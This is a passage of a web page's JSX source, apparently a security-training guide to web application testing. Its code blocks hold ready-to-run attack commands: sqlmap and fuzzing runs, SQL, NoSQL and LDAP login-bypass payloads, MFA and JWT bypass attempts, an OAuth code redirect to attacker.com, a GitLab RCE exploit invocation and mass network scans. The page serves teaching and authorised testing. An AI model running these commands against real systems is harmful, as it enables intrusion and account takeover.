arachni https://example.com --report-save-path=arachni_report.afr
arachni_reporter arachni_report.afr --reporter=html:outfile=report.html

# Custom Burp Suite Automation (using Burp REST API)
curl -X POST "http://127.0.0.1:1337/v0.1/scan" \
  -H "Content-Type: application/json" \
  -d '{
    "scope": {
      "include": [{"rule": "https://example.com/*"}]
    },
    "application_logins": [{
      "username": "admin",
      "password": "password",
      "type": "form"
    }]
  }'

# SQLMap Integration for SQL Injection Testing
sqlmap -u "https://example.com/search?id=1" --batch --random-agent --level=5 --risk=3

# Comprehensive SSL/TLS Testing
testssl.sh --parallel --protocols --server-defaults --headers --vulnerabilities https://example.com

# Custom Python Scanner Integration
python3 -c "
import requests
import json
targets = ['https://example.com', 'https://api.example.com']
for target in targets:
    response = requests.get(target + '/robots.txt')
    if response.status_code == 200:
        print(f'Found robots.txt at {target}')
        print(response.text[:200])
"`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="fuzzing-mastery">
            <AccordionTrigger className="text-lg font-semibold">
              Advanced Fuzzing & Parameter Testing Mastery
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Fuzzing Methodology Framework</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">Black Box Fuzzing</h6>
                      <ul className="text-sm space-y-1">
                        <li>• No source code access required</li>
                        <li>• Input/output observation based</li>
                        <li>• Pattern-based testing approach</li>
                        <li>• Response analysis for anomalies</li>
                        <li>• Suitable for closed-source applications</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">White Box Fuzzing</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Full source code access</li>
                        <li>• Code coverage analysis</li>
                        <li>• Targeted vulnerability testing</li>
                        <li>• Instrumented binary analysis</li>
                        <li>• Guided fuzzing with feedback</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-yellow-900/20 border border-yellow-500 rounded">
                      <h6 className="font-semibold text-yellow-400 mb-2">Grey Box Fuzzing</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Partial source code access</li>
                        <li>• Instrumented testing approach</li>
                        <li>• Feedback-driven optimization</li>
                        <li>• Coverage-guided exploration</li>
                        <li>• Hybrid testing methodology</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Target Parameter Categories</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">HTTP Components</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>GET Parameters:</strong> URL query strings and fragments</li>
                        <li>• <strong>POST Data:</strong> Form data, JSON, XML payloads</li>
                        <li>• <strong>HTTP Headers:</strong> User-Agent, Referer, custom headers</li>
                        <li>• <strong>Cookies:</strong> Session tokens, preferences, tracking</li>
                        <li>• <strong>Path Components:</strong> URL path segments and extensions</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-cyan-400 mb-2">Advanced Targets</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>File Uploads:</strong> Filename, content, metadata</li>
                        <li>• <strong>WebSocket Messages:</strong> Real-time communication</li>
                        <li>• <strong>API Endpoints:</strong> REST, GraphQL, SOAP parameters</li>
                        <li>• <strong>Authentication:</strong> Login forms, OAuth flows</li>
                        <li>• <strong>Business Logic:</strong> Workflow parameters, state</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Master-Level Fuzzing Techniques"
                code={`# Advanced Parameter Discovery & Fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "https://example.com/search?FUZZ=test" -fs 1234 -mc 200,400,500

# Multi-parameter Fuzzing (Cluster Bomb Attack)
ffuf -w users.txt:USER -w passwords.txt:PASS -X POST -d "username=USER&password=PASS" -u https://example.com/login -mc 200,302

# JSON Parameter Fuzzing
wfuzz -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -H "Content-Type: application/json" -d '{"search":"FUZZ"}' https://example.com/api/search

# Header Fuzzing for Security Bypass
ffuf -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt -H "User-Agent: FUZZ" -u https://example.com/admin -mc 200,302

# Advanced SQL Injection Fuzzing
sqlmap -u "https://example.com/product?id=1" --level=5 --risk=3 --batch --tamper=space2comment,charencode,randomcase

# Command Injection Fuzzing
ffuf -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -X POST -d "command=FUZZ" -u https://example.com/exec -fr "error|invalid"

# File Upload Fuzzing
wfuzz -c -z file,/usr/share/seclists/Fuzzing/file-extensions.txt -z file,filenames.txt --data="file=@testFUZ2Z.FUZ2Z" https://example.com/upload

# XSS Payload Fuzzing
ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt -X POST -d "comment=FUZZ" -u https://example.com/comment -mr "FUZZ"

# NoSQL Injection Fuzzing
wfuzz -c -z file,/usr/share/seclists/Fuzzing/Databases/NoSQL.txt -H "Content-Type: application/json" -d '{"user":"admin","pass":"FUZZ"}' https://example.com/api/login

# LDAP Injection Testing
ffuf -w /usr/share/seclists/Fuzzing/LDAP.txt -X POST -d "username=FUZZ&password=test" -u https://example.com/ldap-auth -fr "invalid"

# XXE Fuzzing
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XML-Fuzzing.txt -H "Content-Type: application/xml" -d "FUZZ" https://example.com/xml-parser

# Business Logic Fuzzing
# Price manipulation
ffuf -w <(seq 1 1000) -X POST -d "item_id=1&quantity=FUZZ&price=-1" -u https://example.com/checkout -mc 200,302

# Race Condition Testing
for i in {1..100}; do
  curl -X POST -d "coupon=SAVE50&user_id=123" https://example.com/apply-coupon &
done
wait

# Time-based Blind Fuzzing
ffuf -w /usr/share/seclists/Fuzzing/time-based-blind.txt -X POST -d "id=1' AND FUZZ --" -u https://example.com/search -delay 5s

# Custom Payload Generation
python3 -c "
import itertools
chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
for length in range(1, 5):
    for combo in itertools.product(chars, repeat=length):
        print(''.join(combo))
" > custom_payloads.txt

# Blind XSS Testing with Burp Collaborator
ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Filters.txt -X POST -d "feedback=FUZZ" -u https://example.com/contact -delay 2s

# GraphQL Fuzzing
python3 -c "
queries = [
    'query { __schema { types { name } } }',
    'query { user(id: \"1\") { id name email } }',
    'mutation { deleteUser(id: \"1\") { success } }'
]
import requests
for query in queries:
    requests.post('https://example.com/graphql', json={'query': query})
"

# API Rate Limiting Testing
for i in {1..1000}; do
  curl -H "Authorization: Bearer token123" https://example.com/api/data &
  if [ $((i % 10)) -eq 0 ]; then sleep 1; fi
done

# Advanced Cookie Fuzzing
ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -H "Cookie: sessionid=FUZZ; csrftoken=abc123" -u https://example.com/dashboard

# Template Injection Fuzzing
ffuf -w /usr/share/seclists/Fuzzing/template-engines-special-vars.txt -X POST -d "template=Hello FUZZ" -u https://example.com/render -mr "root|admin|config"`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="static-dynamic-analysis">
            <AccordionTrigger className="text-lg font-semibold">
              SAST/DAST Integration & Code Analysis
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">SAST (Static Application Security Testing)</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">Enterprise SAST Tools</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>SonarQube:</strong> Multi-language code quality platform</li>
                        <li>• <strong>CodeQL:</strong> GitHub's semantic code analysis</li>
                        <li>• <strong>Semgrep:</strong> Fast static analysis with custom rules</li>
                        <li>• <strong>Checkmarx:</strong> Enterprise SAST solution</li>
                        <li>• <strong>Veracode:</strong> Cloud-based static analysis</li>
                        <li>• <strong>Fortify:</strong> HP Enterprise Security suite</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">Open Source SAST</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>Bandit:</strong> Python security linter</li>
                        <li>• <strong>ESLint Security:</strong> JavaScript security rules</li>
                        <li>• <strong>Brakeman:</strong> Ruby on Rails security scanner</li>
                        <li>• <strong>SpotBugs:</strong> Java static analysis</li>
                        <li>• <strong>PMD:</strong> Source code analyzer</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">DAST (Dynamic Application Security Testing)</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">Professional DAST Solutions</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>Burp Suite Professional:</strong> Manual + automated testing</li>
                        <li>• <strong>OWASP ZAP:</strong> Free dynamic security scanner</li>
                        <li>• <strong>Acunetix:</strong> Automated web vulnerability scanner</li>
                        <li>• <strong>Rapid7 AppSpider:</strong> Enterprise DAST platform</li>
                        <li>• <strong>Qualys WAS:</strong> Cloud-based web app scanning</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
                      <h6 className="font-semibold text-orange-400 mb-2">Specialized DAST Tools</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>Nikto:</strong> Web server vulnerability scanner</li>
                        <li>• <strong>W3af:</strong> Web application attack framework</li>
                        <li>• <strong>Arachni:</strong> Ruby-based web scanner</li>
                        <li>• <strong>Skipfish:</strong> Active web reconnaissance</li>
                        <li>• <strong>Wapiti:</strong> Web application vulnerability scanner</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="mt-6">
                <h5 className="font-semibold mb-3 text-cybr-primary">CI/CD Security Integration</h5>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div className="p-3 bg-cybr-muted/30 rounded">
                    <h6 className="font-semibold text-cyan-400 mb-2">Pipeline Integration</h6>
                    <ul className="text-sm space-y-1">
                      <li>• Jenkins security plugins</li>
                      <li>• GitHub Actions security workflows</li>
                      <li>• GitLab CI/CD security templates</li>
                      <li>• Azure DevOps security tasks</li>
                      <li>• AWS CodePipeline integration</li>
                    </ul>
                  </div>
                  
                  <div className="p-3 bg-cybr-muted/30 rounded">
                    <h6 className="font-semibold text-yellow-400 mb-2">Dependency Scanning</h6>
                    <ul className="text-sm space-y-1">
                      <li>• npm audit (Node.js)</li>
                      <li>• Snyk vulnerability database</li>
                      <li>• OWASP Dependency Check</li>
                      <li>• WhiteSource security platform</li>
                      <li>• Sonatype Nexus Lifecycle</li>
                    </ul>
                  </div>
                  
                  <div className="p-3 bg-cybr-muted/30 rounded">
                    <h6 className="font-semibold text-red-400 mb-2">Container Security</h6>
                    <ul className="text-sm space-y-1">
                      <li>• Trivy container scanner</li>
                      <li>• Clair vulnerability scanner</li>
                      <li>• Anchore container analysis</li>
                      <li>• Twistlock security platform</li>
                      <li>• Aqua Security solutions</li>
                    </ul>
                  </div>
                </div>
              </div>

              <CodeExample
                language="yaml"
                title="CI/CD Security Pipeline Configuration"
                code={`# GitHub Actions Security Workflow
name: Security Scan Pipeline
on: [push, pull_request]

jobs:
  sast-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      # Static Code Analysis
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/secrets
            p/owasp-top-ten
      
      # Dependency Scanning
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
      
      # Container Scanning
      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:latest'
          format: 'sarif'
          output: 'trivy-results.sarif'

  dast-scan:
    runs-on: ubuntu-latest
    needs: sast-scan
    steps:
      - name: ZAP Baseline Scan
        uses: zaproxy/action-baseline@v0.6.1
        with:
          target: 'https://staging.example.com'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'

# Jenkins Pipeline (Jenkinsfile)
pipeline {
    agent any
    
    stages {
        stage('SAST Scan') {
            steps {
                script {
                    // SonarQube Analysis
                    sh 'sonar-scanner -Dsonar.projectKey=myapp'
                    
                    // Semgrep Scan
                    sh 'semgrep --config=auto --json --output=semgrep.json .'
                    
                    // Bandit for Python
                    sh 'bandit -r . -f json -o bandit-report.json'
                }
            }
        }
        
        stage('Dependency Check') {
            steps {
                dependencyCheck additionalArguments: '', odcInstallation: 'Default'
                dependencyCheckPublisher pattern: 'dependency-check-report.xml'
            }
        }
        
        stage('DAST Scan') {
            steps {
                script {
                    // OWASP ZAP Scan
                    sh '''
                        docker run -v $(pwd):/zap/wrk/:rw \\
                        -t owasp/zap2docker-stable \\
                        zap-full-scan.py -t https://staging.example.com \\
                        -r zap_report.html
                    '''
                }
            }
        }
    }
    
    post {
        always {
            publishHTML([
                allowMissing: false,
                alwaysLinkToLastBuild: true,
                keepAll: true,
                reportDir: '.',
                reportFiles: 'zap_report.html',
                reportName: 'ZAP Security Report'
            ])
        }
    }
}

# GitLab CI/CD Security Template
include:
  - template: Security/SAST.gitlab-ci.yml
  - template: Security/Dependency-Scanning.gitlab-ci.yml
  - template: Security/Container-Scanning.gitlab-ci.yml
  - template: Security/DAST.gitlab-ci.yml

variables:
  DAST_WEBSITE: "https://staging.example.com"
  SAST_EXCLUDED_PATHS: "spec, test, tests, tmp"

stages:
  - test
  - security
  - deploy

custom-sast:
  stage: security
  script:
    - semgrep --config=auto --json --output=gl-sast-report.json .
  artifacts:
    reports:
      sast: gl-sast-report.json

custom-dependency-scan:
  stage: security
  script:
    - safety check --json --output safety-report.json
    - npm audit --json > npm-audit.json
  artifacts:
    reports:
      dependency_scanning: safety-report.json

# Docker Security Scanning
docker-security-scan:
  stage: security
  script:
    - docker build -t myapp:$CI_COMMIT_SHA .
    - trivy image --format template --template "@contrib/gitlab.tpl" -o gl-container-scanning-report.json myapp:$CI_COMMIT_SHA
  artifacts:
    reports:
      container_scanning: gl-container-scanning-report.json`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="specialized-scanning">
            <AccordionTrigger className="text-lg font-semibold">
              Specialized Vulnerability Assessment Techniques
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Cloud Security Scanning</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">AWS Security Tools</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>ScoutSuite:</strong> Multi-cloud security auditing</li>
                        <li>• <strong>Prowler:</strong> AWS security assessment tool</li>
                        <li>• <strong>Pacu:</strong> AWS exploitation framework</li>
                        <li>• <strong>CloudMapper:</strong> AWS environment analysis</li>
                        <li>• <strong>S3Scanner:</strong> S3 bucket security assessment</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">Azure Security Assessment</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>ROADtools:</strong> Azure AD reconnaissance</li>
                        <li>• <strong>PowerZure:</strong> Azure exploitation toolkit</li>
                        <li>• <strong>MicroBurst:</strong> Azure security testing</li>
                        <li>• <strong>Stormspotter:</strong> Azure Red Team tool</li>
                        <li>• <strong>AADInternals:</strong> Azure AD manipulation</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">API Security Testing</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">REST API Testing</h6>
                      <ul className="text-sm space-y-1">
                        <li>• HTTP method manipulation (PUT, DELETE, PATCH)</li>
                        <li>• Parameter pollution attacks</li>
                        <li>• Content-Type confusion attacks</li>
                        <li>• Rate limiting bypass techniques</li>
                        <li>• CORS policy exploitation</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-orange-400 mb-2">GraphQL Security</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Introspection query abuse</li>
                        <li>• Query complexity attacks (DoS)</li>
                        <li>• Nested query exploitation</li>
                        <li>• Batch query attacks</li>
                        <li>• Authorization bypass techniques</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Advanced Specialized Scanning Techniques"
                code={`# Cloud Security Assessment
# AWS Security Scanning
scout aws --profile default --report-dir aws_report/
prowler -g cislevel2 -M csv,html
pacu --session mysession --exec enumerate_services_boto3

# S3 Bucket Security Assessment
aws s3 ls s3://company-backup --recursive
s3scanner -f bucket_names.txt -o bucket_results.txt
cloud_enum -k company -t 50

# Azure Security Scanning
roadrecon auth -u user@company.com -p password
roadrecon gather --tokens tokens.json
roadrecon gui --database roadrecon.db

# GCP Security Assessment
gcp-scanner -p project-id -o gcp_results.json
gcpbucketbrute -k keywords.txt -t 20

# API Security Testing
# REST API Enumeration
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://api.example.com/v1/FUZZ -mc 200,400,401,403,500

# GraphQL Security Testing
python3 graphql-playground.py -t https://api.example.com/graphql
graphql-cop -t https://api.example.com/graphql -o graphql_report.json

# API Rate Limiting Tests
for i in {1..1000}; do
  curl -H "Authorization: Bearer token123" https://api.example.com/users &
  if [ $((i % 50)) -eq 0 ]; then echo "Sent $i requests"; fi
done

# JWT Security Testing
jwt_tool.py -t https://api.example.com/admin -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
python3 jwt_confusion.py -u https://api.example.com/profile -j jwt_token

# Mobile Web Application Testing
# iOS Safari User-Agent Testing
curl -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15" https://m.example.com

# Progressive Web App Security
python3 pwa_security_scanner.py -u https://app.example.com
service-worker-analyzer https://app.example.com/sw.js

# IoT Device Web Interface Testing
nmap -p 80,443,8080,8443,9000,9001 --script http-title,http-headers iot_devices.txt
iot-inspector -t 192.168.1.0/24 -p 80,443,8080

# Container Security Scanning
trivy image nginx:latest --format json -o trivy_nginx.json
docker-bench-security.sh
clair-scanner --ip $(docker-machine ip) nginx:latest

# Kubernetes Security Assessment
kube-bench --targets=master,node,etcd,policies
kube-hunter --remote some.k8s-cluster.com
kubeaudit all -f deployment.yaml

# Serverless Security Testing
# AWS Lambda Testing
lambda-guard scan function.zip
slic-watch deploy --function-name my-function

# Function-as-a-Service (FaaS) Testing
python3 faas_security_scanner.py -u https://functions.example.com

# CI/CD Pipeline Security
# Jenkins Security Assessment
python3 jenkins_attack_framework.py -u https://jenkins.example.com
jenkins-scanner -u https://jenkins.example.com -w wordlist.txt

# GitLab Security Testing
gitlab-enum -u https://gitlab.example.com -t token123
python3 gitlab_rce_cve_2021_22205.py -u https://gitlab.example.com

# Docker Registry Security
reg info registry.example.com
docker-registry-scanner -u https://registry.example.com

# SSL/TLS Comprehensive Testing
testssl.sh --parallel --protocols --server-defaults --headers --vulnerabilities https://example.com
sslscan --show-certificate --no-colour https://example.com | tee ssl_report.txt

# Certificate Transparency Monitoring
certstream-python -f "*.example.com" --json | jq -r '.data.leaf_cert.subject.CN'

# Network Service Discovery
nmap -sV -sC -O -A --script=default,discovery,safe target_network/24
masscan -p1-65535 --rate=10000 10.0.0.0/8 --exclude 255.255.255.255`}
              />
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>

      {/* Manual Testing Methodologies */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <Target className="h-7 w-7 text-cybr-primary" />
          Advanced Manual Testing & Exploitation
        </h3>
        
        <Accordion type="single" collapsible className="space-y-4">
          <AccordionItem value="session-security">
            <AccordionTrigger className="text-lg font-semibold">
              Session Management & Authentication Security
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Session Security Testing Areas</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">Token Analysis</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>Entropy Testing:</strong> Randomness and predictability analysis</li>
                        <li>• <strong>Token Scope:</strong> Domain restrictions and path limitations</li>
                        <li>• <strong>Lifecycle Management:</strong> Creation, renewal, expiration</li>
                        <li>• <strong>Concurrent Sessions:</strong> Multiple login handling</li>
                        <li>• <strong>Session Fixation:</strong> Pre-authentication token persistence</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">Cookie Security</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>HttpOnly Attribute:</strong> XSS protection verification</li>
                        <li>• <strong>Secure Flag:</strong> HTTPS-only transmission</li>
                        <li>• <strong>SameSite Policy:</strong> CSRF protection mechanism</li>
                        <li>• <strong>Path & Domain:</strong> Scope restriction testing</li>
                        <li>• <strong>Expiration:</strong> Lifetime and timeout validation</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Authentication Bypass Techniques</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">Injection-Based Bypass</h6>
                      <ul className="text-sm space-y-1">
                        <li>• SQL injection in login forms</li>
                        <li>• NoSQL injection (MongoDB, CouchDB)</li>
                        <li>• LDAP injection for directory services</li>
                        <li>• XPath injection in XML authentication</li>
                        <li>• Command injection in custom auth</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
                      <h6 className="font-semibold text-orange-400 mb-2">Logic-Based Bypass</h6>
                      <ul className="text-sm space-y-1">
                        <li>• HTTP parameter pollution</li>
                        <li>• Race condition attacks</li>
                        <li>• Password reset token manipulation</li>
                        <li>• Multi-factor authentication bypass</li>
                        <li>• OAuth implementation flaws</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Advanced Session & Authentication Testing"
                code={`# Session Token Entropy Analysis
python3 -c "
import requests
import collections
tokens = []
for i in range(1000):
    r = requests.post('https://example.com/login', data={'user':'test','pass':'test'})
    if 'sessionid' in r.cookies:
        tokens.append(r.cookies['sessionid'])
print('Unique tokens:', len(set(tokens)))
print('Token length:', len(tokens[0]) if tokens else 0)
print('Character distribution:', collections.Counter(''.join(tokens)))
"

# Session Fixation Testing
# Step 1: Get pre-auth session
curl -c session1.txt https://example.com/login
# Step 2: Login with fixed session
curl -b session1.txt -c session2.txt -d "user=admin&pass=password" https://example.com/login
# Step 3: Check if session ID remains the same
diff session1.txt session2.txt

# Concurrent Session Testing
# Terminal 1
curl -c admin_session1.txt -d "user=admin&pass=password" https://example.com/login
curl -b admin_session1.txt https://example.com/admin/dashboard

# Terminal 2
curl -c admin_session2.txt -d "user=admin&pass=password" https://example.com/login
curl -b admin_session2.txt https://example.com/admin/dashboard

# Cookie Security Analysis
curl -I https://example.com/login | grep -i "set-cookie"
python3 -c "
import requests
r = requests.get('https://example.com/dashboard')
for cookie in r.cookies:
    print(f'Cookie: {cookie.name}')
    print(f'Value: {cookie.value}')
    print(f'Domain: {cookie.domain}')
    print(f'Path: {cookie.path}')
    print(f'Secure: {cookie.secure}')
    print(f'HttpOnly: {cookie.has_nonstandard_attr(\"HttpOnly\")}')
    print('---')
"

# Authentication Bypass Attempts
# SQL Injection in Login
curl -X POST -d "username=admin'--&password=anything" https://example.com/login
curl -X POST -d "username=admin' OR '1'='1'--&password=test" https://example.com/login

# NoSQL Injection
curl -X POST -H "Content-Type: application/json" -d '{"username":{"$ne":null},"password":{"$ne":null}}' https://example.com/api/login

# LDAP Injection
curl -X POST -d "username=*)(uid=*))(|(uid=*&password=anything" https://example.com/ldap-login

# HTTP Parameter Pollution
curl -X POST -d "username=user&username=admin&password=test" https://example.com/login

# Password Reset Token Analysis
python3 -c "
import requests
tokens = []
for i in range(50):
    r = requests.post('https://example.com/forgot-password', data={'email':'test@example.com'})
    # Extract token from response or email
    token = extract_token(r.text)  # Custom function
    tokens.append(token)
print('Token patterns:', analyze_patterns(tokens))
"

# Multi-Factor Authentication Bypass
# Bypass attempt 1: Skip MFA step
curl -X POST -d "username=admin&password=password" https://example.com/login
curl -b cookies.txt https://example.com/dashboard  # Skip MFA

# Bypass attempt 2: Reuse MFA codes
curl -X POST -d "username=admin&password=password&mfa_code=123456" https://example.com/verify-mfa
sleep 60
curl -X POST -d "username=admin&password=password&mfa_code=123456" https://example.com/verify-mfa

# JWT Token Manipulation
python3 jwt_tool.py -t https://example.com/api/profile -rh "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."

# OAuth Flow Testing
# Authorization code interception
curl "https://oauth.example.com/authorize?client_id=123&redirect_uri=http://attacker.com&response_type=code&scope=read"

# Session Timeout Testing
curl -c session.txt -d "user=admin&pass=password" https://example.com/login
sleep 1800  # Wait 30 minutes
curl -b session.txt https://example.com/dashboard

# Cross-Domain Session Testing
curl -c cookies.txt https://app.example.com/login
curl -b cookies.txt https://api.example.com/data  # Test subdomain sharing

# Session Invalidation Testing
curl -c session.txt -d "user=admin&pass=password" https://example.com/login
curl -b session.txt https://example.com/logout
curl -b session.txt https://example.com/dashboard  # Should fail

# Brute Force Protection Testing
for i in {1..100}; do
  curl -X POST -d "username=admin&password=wrong$i" https://example.com/login
  if [ $((i % 10)) -eq 0 ]; then
    echo "Attempt $i - checking for lockout"
    sleep 1
  fi
done`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="authorization-testing">
            <AccordionTrigger className="text-lg font-semibold">
              Authorization & Access Control Testing
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Access Control Models</h5>
                  <div className="space-y-2">
                    <div className="p-2 bg-blue-900/20 border border-blue-500 rounded text-sm">
                      <strong className="text-blue-400">RBAC:</strong> Role-Based Access Control
                    </div>
                    <div className="p-2 bg-green-900/20 border border-green-500 rounded text-sm">
                      <strong className="text-green-400">ABAC:</strong> Attribute-Based Access Control
                    </div>
                    <div className="p-2 bg-yellow-900/20 border border-yellow-500 rounded text-sm">
                      <strong className="text-yellow-400">DAC:</strong> Discretionary Access Control
                    </div>
                    <div className="p-2 bg-purple-900/20 border border-purple-500 rounded text-sm">
                      <strong className="text-purple-400">MAC:</strong> Mandatory Access Control
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Common Authorization Flaws</h5>
                  <div className="space-y-2">
                    <div className="p-2 bg-red-900/20 border border-red-500 rounded text-sm">
                      <strong className="text-red-400">IDOR:</strong> Insecure Direct Object References
                    </div>
                    <div className="p-2 bg-orange-900/20 border border-orange-500 rounded text-sm">
                      <strong className="text-orange-400">Vertical Escalation:</strong> User to admin
                    </div>
                    <div className="p-2 bg-pink-900/20 border border-pink-500 rounded text-sm">
                      <strong className="text-pink-400">Horizontal Escalation:</strong> User A to User B
                    </div>
                    <div className="p-2 bg-cyan-900/20 border border-cyan-500 rounded text-sm">
                      <strong className="text-cyan-400">Function Level:</strong> Missing access controls
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Testing Methodologies</h5>
                  <div className="space-y-2">
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-lime-400">Parameter Manipulation:</strong> ID modification
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-violet-400">Path Traversal:</strong> Directory access
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-rose-400">HTTP Method Testing:</strong> PUT, DELETE
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-amber-400">Cookie Manipulation:</strong> Role modification
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Comprehensive Authorization Testing"
                code={`# IDOR (Insecure Direct Object Reference) Testing
# Enumerate user IDs
for id in {1..1000}; do
  curl -H "Authorization: Bearer user_token" https://example.com/api/users/$id | grep -q "access denied" || echo "Accessible ID: $id"
done

# Test different object types
curl -H "Authorization: Bearer user123_token" https://example.com/api/documents/456
curl -H "Authorization: Bearer user123_token" https://example.com/api/orders/789
curl -H "Authorization: Bearer user123_token" https://example.com/api/profiles/101

# GUID/UUID IDOR Testing
python3 -c "
import requests
import uuid
for i in range(100):
    test_uuid = str(uuid.uuid4())
    r = requests.get(f'https://example.com/api/files/{test_uuid}', 
